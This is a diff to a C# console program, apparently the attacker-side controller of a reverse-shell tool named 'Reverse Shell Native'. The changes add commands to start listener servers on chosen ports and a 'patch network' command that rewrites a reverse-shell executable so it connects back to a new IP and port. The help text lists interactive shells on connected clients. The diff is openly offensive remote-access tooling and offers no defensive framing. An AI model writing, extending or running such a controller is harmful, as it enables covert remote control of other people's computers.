@@ -5,6 +5,7 @@ namespace SocketServer
     internal class Program
     {
         internal static Dictionary<int, Server> Servers;
+        internal static Dictionary<int, ProxyServer> ProxyServers;
         internal static Client CurrentSelectedClient;
         private static bool isInInteractiveMode = false;
 
@@ -13,11 +14,19 @@ namespace SocketServer
             Console.CancelKeyPress += Console_CancelKeyPress;
             Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);
             Servers = new Dictionary<int, Server>();
+            ProxyServers = new Dictionary<int, ProxyServer>();
 
-            new Thread(static () =>
+             /*new Thread(static () =>
             {
                 Servers.Add(8081, new Server(8081, "*"));
             }).Start();
+
+           new Thread(static () =>
+            {
+                ProxyServers.Add(8082, new ProxyServer(8082, "*"));
+            }).Start();*/
+
+            Console.WriteLine("______                               _____ _          _ _   _   _       _   _           \r\n| ___ \\                             /  ___| |        | | | | \\ | |     | | (_)          \r\n| |_/ /_____   _____ _ __ ___  ___  \\ `--.| |__   ___| | | |  \\| | __ _| |_ ___   _____ \r\n|    // _ \\ \\ / / _ \\ '__/ __|/ _ \\  `--. \\ '_ \\ / _ \\ | | | . ` |/ _` | __| \\ \\ / / _ \\\r\n| |\\ \\  __/\\ V /  __/ |  \\__ \\  __/ /\\__/ / | | |  __/ | | | |\\  | (_| | |_| |\\ V /  __/\r\n\\_| \\_\\___| \\_/ \\___|_|  |___/\\___| \\____/|_| |_|\\___|_|_| \\_| \\_/\\__,_|\\__|_| \\_/ \\___|\r\n                                                                                        \r\n                                                                                        ");
 
             MainMenu();
         }
@@ -43,6 +52,27 @@ namespace SocketServer
 
                 switch (command)
                 {
+                    case "server":
+                        switch (split[1])
+                        {
+                            case "start":
+                                int port = int.Parse(split[2]);
+                                new Thread(() =>
+                                {
+                                    Servers.Add(port, new Server(port, "*"));
+                                }).Start();
+                                break;
+
+                            case "stop":break;
+                        }
+                        break;
+                    case "patch":
+                        if (split[1] == "network") 
+                        {
+                            
+                            PEPacther.Patch(split[2], split[3], split.Length == 5 ? split[4] : "patched");
+                        }
+                        break;
                     case "display":
                     case "list":
                         foreach (KeyValuePair<int, Server> server in Servers)
@@ -99,10 +129,14 @@ namespace SocketServer
 
                     case "help":
                         Console.WriteLine("Commands:");
-                        Console.WriteLine("  display/list          - Show all connected clients");
-                        Console.WriteLine("  select <endpoint>     - Select a client");
-                        Console.WriteLine("  interact/shell        - Enter interactive shell with selected client");
-                        Console.WriteLine("  exit                  - Exit the program");
+                        Console.WriteLine("  display/list                                   - Show all connected clients");
+                        Console.WriteLine("  select <endpoint>                              - Select a client");
+                        Console.WriteLine("  interact/shell                                 - Enter interactive shell with selected client");
+                        Console.WriteLine("  server         ");
+                        Console.WriteLine("     start <port>                                - Start a new server");
+                        Console.WriteLine("  patch         ");
+                        Console.WriteLine("     network <ip> <port> [OPT]<output name>      - Patch the reverse shell with a new endpoint to connect");
+                        Console.WriteLine("  exit                                           - Exit the program");
                         break;
 
                     case "exit":
